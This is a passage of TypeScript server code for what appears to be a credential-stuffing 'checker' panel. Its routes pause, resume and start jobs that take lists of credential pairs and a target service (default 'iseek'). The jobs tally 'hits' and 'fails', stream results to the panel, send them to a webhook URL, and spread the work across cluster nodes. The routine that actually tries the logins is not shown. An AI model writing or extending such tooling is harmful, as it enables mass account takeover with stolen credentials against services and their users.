  jobEmit(job, { type: "paused", hits: job.hits, fails: job.fails, errors: job.errors });
  res.json({ ok: true, status: "paused" });
});

// PATCH /api/checker/:jobId/resume — resume a paused job
router.patch("/checker/:jobId/resume", (req, res): void => {
  const job = checkerJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "not found" }); return; }
  if (job.status !== "paused") { res.json({ ok: false, reason: "not paused" }); return; }
  job.paused = false;
  job.status = "running";
  jobEmit(job, { type: "resumed", hits: job.hits, fails: job.fails, errors: job.errors });
  res.json({ ok: true, status: "running" });
});

// POST /api/checker/stream — backward-compat SSE endpoint (used by streamFromPeer on peer nodes)
// Internally creates a job and subscribes the response to it.
// Returns X-Checker-Job-Id header so the panel can reconnect after browser close.
router.post("/checker/stream", (req, res): void => {
  const { credentials, target = "iseek", webhookUrl, clusterNodes } = req.body as {
    credentials?:  string[];
    target?:       string;
    webhookUrl?:   string;
    clusterNodes?: string[];
  };

  if (!VALID_CHECKER_TARGETS.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "Invalid target" }); return;
  }
  if (!Array.isArray(credentials) || credentials.length === 0) {
    res.status(400).json({ error: "credentials required" }); return;
  }
  const pairs = parseCredentials(credentials.join("\n"));
  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials" }); return;
  }

  const jobId = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 7)}`;
  const job: CheckerJob = {
    id: jobId, target: target as CheckerTarget, status: "running",
    hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
    startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
    paused: false,
  };
  checkerJobs.set(jobId, job);

  // Expose jobId so the panel can reconnect (readable on the initial fetch response)
  res.setHeader("X-Checker-Job-Id", jobId);

  void runCheckerJobAsync(job, pairs, webhookUrl, clusterNodes);
  sseSubscribe(job, res);
});

export default router;
